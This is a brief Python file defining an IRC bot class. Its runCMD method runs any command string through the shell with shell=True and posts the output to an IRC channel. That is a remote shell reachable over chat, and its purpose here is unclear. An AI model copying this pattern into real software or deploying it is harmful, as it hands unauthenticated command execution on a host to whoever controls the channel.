import subprocess
import re
import sys
from myirc import MyIrc

class Bot(MyIrc):

    channelPattern = re.compile("\w*\!")

    def __init__(self, server, port, channel, nick):
        self.server = server
        self.port = port
        self.channel = channel
        self.nick = nick
        return

    def runCMD(self, channel, command):
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output, err = output.communicate()
        output = output.decode("utf-8")
        output = output.strip("\n")
        self.sendMessage(channel, output)
        return

    def findChannel(self, message):
        channel = self.channelPattern.findall(message)
        channel = channel[0].strip("!")
        return channel

    def hello(self):
        self.ircSend("Hello!")
        return

    def sendMessage(self, channel, ircMessage):
        self.ircMessage(channel, ircMessage)
        return

